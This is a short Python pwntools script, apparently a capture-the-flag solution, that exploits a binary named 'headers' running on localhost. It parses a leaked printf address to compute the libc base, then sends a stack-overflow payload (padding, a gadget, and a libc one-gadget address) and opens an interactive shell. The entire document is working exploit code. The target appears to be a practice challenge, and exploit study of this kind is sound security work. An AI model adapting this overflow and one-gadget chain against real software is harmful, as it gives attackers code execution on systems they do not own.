from pwn import *

elf = context.binary = ELF("../attachments/headers")
libc = ELF('../attachments/libc-2.23.so')

# one gadget condition
MOV_EAX_0_POP_RBP = p64(0x401263)
PRINTF_WRAPPER = p64(0x401186)
POP_RDI_RET = p64(0x4012d3)
ONE_GADGET_OFFSET = 0x45226

r = remote('localhost', 9000)
r.recvuntil("printf ")
printf_addr = int(r.recvuntil("\n")[:-1], 16)
log.info(f"Leaked printf: {hex(printf_addr)}")

libc.address = printf_addr - libc.sym.printf
log.info(f"libc address: {hex(libc.address)}")
log.info(f"one gadget: {hex(libc.address + ONE_GADGET_OFFSET)}")
r.recvuntil("guarantee it.\n")

payload  = b'A' * 128 + b'B' * 8
payload += MOV_EAX_0_POP_RBP
payload += b'B' * 8
payload += p64(libc.address + ONE_GADGET_OFFSET)

r.sendline(payload)
r.interactive()
